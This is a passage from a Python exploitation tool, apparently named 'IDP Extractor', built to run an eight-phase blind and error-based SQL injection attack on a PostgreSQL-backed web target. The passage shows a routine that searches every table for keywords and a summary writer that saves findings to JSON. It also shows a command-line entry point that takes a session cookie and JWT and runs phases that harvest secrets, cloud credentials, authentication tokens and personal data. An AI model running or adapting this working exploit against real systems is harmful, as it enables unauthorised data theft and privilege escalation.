                continue

            hit = self.check_exists(
                f"EXISTS(SELECT 1 FROM gssp_common.{tbl} "
                f"WHERE {tbl}::text ILIKE '%{keyword}%' LIMIT 1)",
                f"Checking {tbl}",
            )
            if hit is True:
                self.log(f"  [!!!] MATCH in gssp_common.{tbl}")
                sample = self.extract(
                    f"SELECT ({tbl})::text FROM gssp_common.{tbl} "
                    f"WHERE ({tbl})::text ILIKE '%{keyword}%' LIMIT 1",
                    f"Sample from {tbl}",
                )
                if sample:
                    self.finding(4, f"Keyword '{keyword}' found in {tbl}", sample)

    # ══════════════════════════════════════════════════════════════
    # SUMMARY & REPORT
    # ══════════════════════════════════════════════════════════════
    def print_summary(self, all_results):
        self.log("\n" + "=" * 60)
        self.log(" FINAL SUMMARY")
        self.log("=" * 60)
        self.log(f"[*] Total HTTP requests: {self.request_count}")

        for phase_name, data in all_results.items():
            if isinstance(data, dict):
                hits = {k: v for k, v in data.items() if v and v != "[NULL]"}
                self.log(f"\n[*] {phase_name}: {len(hits)} values extracted")
                for k, v in hits.items():
                    display = str(v)[:100]
                    self.log(f"    {k}: {display}{'...' if len(str(v)) > 100 else ''}")
            elif isinstance(data, list):
                self.log(f"\n[*] {phase_name}: {len(data)} items found")
                for item in data:
                    self.log(f"    {item}")

        if self.findings:
            self.log(f"\n{'=' * 60}")
            self.log(f" FINDINGS ({len(self.findings)} total)")
            self.log("=" * 60)
            for f in sorted(self.findings, key=lambda x: -x["severity"]):
                self.log(f"  [{'!' * f['severity']}/!!!!!] {f['title']}")
                self.log(f"           {f['value'][:150]}")

            report_path = os.path.join(self.output_dir, "findings.json")
            with open(report_path, "w", encoding="utf-8") as fp:
                json.dump(self.findings, fp, indent=2)
            self.log(f"\n[*] Findings saved to {report_path}")
        else:
            self.log("\n[*] No high-severity findings.")

        self.log(f"[*] Full log saved to {self.log_file.name}")
        self.log_file.close()


def main():
    parser = argparse.ArgumentParser(
        description="SQLi PoC - IDP Extractor (8-phase PostgreSQL exploitation)"
    )
    parser.add_argument("--cookie", required=True, help="Full Cookie header value")
    parser.add_argument("--token", required=True, help="JWT Bearer token (no 'Bearer ' prefix)")
    parser.add_argument("--proxy", default="http://192.193.216.152:8080", help="HTTP proxy")
    parser.add_argument("--phase", type=int, choices=[1, 2, 3, 4, 5, 6, 7, 8], default=0,
                        help="Run specific phase (1-8), 0=all")
    parser.add_argument("--query", help="Run a custom SQL query")
    parser.add_argument("--search", help="Search ALL tables for a keyword")
    parser.add_argument("--no-proxy", action="store_true", help="Disable proxy")
    parser.add_argument("--output", default="sqli_output", help="Output directory")
    parser.add_argument("--resume", action="store_true",
                        help="Resume from last run (skips already-extracted queries)")
    args = parser.parse_args()

    proxy = None if args.no_proxy else args.proxy
    ext = SQLiExtractor(args.cookie, args.token, proxy, args.output)
    if not args.resume:
        ext.completed_queries = {}

    print(r"""
   _____ ____    __    _   ____        ______
  / ___// __ \  / /   (_) / __ \____  / ____/
  \__ \/ / / / / /   / / / /_/ / __ \/ /
 ___/ / /_/ / / /___/ / / ____/ /_/ / /___
/____/\___\_\/_____/_/ /_/    \____/\____/
    IDP Extractor v2 — 8-Phase PostgreSQL Exploitation
    Boolean-Blind + Error-Based | All Attack Vectors
    """)
    print(f"[*] Target:  {TARGET_URL}")
    print(f"[*] Proxy:   {proxy or 'disabled'}")
    print(f"[*] Output:  {args.output}/")
    phase_str = str(args.phase) if args.phase else "ALL (1-8)"
    if args.query:
        phase_str = "Custom query"
    elif args.search:
        phase_str = f"Search: {args.search}"
    print(f"[*] Phase:   {phase_str}")
    if args.resume:
        print(f"[*] Resume:  ON (will skip cached queries)")
    elif not args.resume and os.path.exists(os.path.join(args.output, "progress.json")):
        print(f"[*] Note:    Previous progress found. Use --resume to skip completed queries.")
    print()

    if not ext.test():
        sys.exit(1)

    if args.query:
        ext.extract(args.query, "Custom query")
        print(f"\n[*] Total requests: {ext.request_count}")
        return

    if args.search:
        ext.search_all_tables(args.search)
        ext.print_summary({})
        return

    all_results = {}
    phases = {
        1: ("Phase 1: Recon",           ext.phase1_recon),
        2: ("Phase 2: Columns",         ext.phase2_columns),
        3: ("Phase 3: Secrets",         ext.phase3_secrets),
        4: ("Phase 4: Escalation",      ext.phase4_escalation),
        5: ("Phase 5: Cloud Creds",     ext.phase5_cloud_creds),
        6: ("Phase 6: JWT/Auth",        ext.phase6_jwt_auth),
        7: ("Phase 7: Advanced PG",     ext.phase7_advanced),
        8: ("Phase 8: PII",            ext.phase8_pii),
    }

    run_phases = [args.phase] if args.phase else range(1, 9)
    for p in run_phases:
        name, func = phases[p]
        all_results[name] = func()

    ext.print_summary(all_results)


if __name__ == "__main__":
    main()
